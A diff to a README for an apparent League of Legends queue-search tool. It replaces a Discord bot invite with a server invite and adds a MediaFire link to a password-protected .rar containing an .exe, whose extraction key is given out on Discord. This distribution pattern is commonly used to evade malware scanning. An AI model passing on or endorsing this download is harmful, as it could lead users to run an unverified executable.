@@ -3,7 +3,7 @@
 </div>
   <hr>
  <div align="center" dir="auto">
-  <a href="https://discord.com/api/oauth2/authorize?client_id=941379078475362344&permissions=8&scope=bot" rel="nofollow" target="_blank">
+  <a href="https://discord.gg/vuz6R2zPq6" rel="nofollow" target="_blank">
       <img src="https://img.shields.io/badge/Discord-7289DA?style=for-the-badge&logo=discord&logoColor=white" alt="Invite Me">
   </a>
   <a href="https://www.python.org/downloads/release/python-3910" rel="nofollow" target="_blank">
@@ -32,4 +32,6 @@
 <img src="https://technology.riotgames.com/sites/default/files/lcu_ui_ready_check.gif" alt="pic2" width="452">
 <img src="https://i.postimg.cc/kGMD1Wnc/pic2.png" alt="pic2">
 <hr>
-<p>P.S: Work in BR and US Servers.</p>
+
+<p>Download .exe program <a href="https://www.mediafire.com/file/o25tbs7v4euhxvs/lol_queue_search.rar/file" target="_blank">HERE</a></p> 
+<p>You can get the extraction key from the <a  href="https://discord.gg/heSF5GGS5q" target="_blank">keys category</a  > on our <a href="https://discord.gg/vuz6R2zPq6" target="_blank">server</a></p>
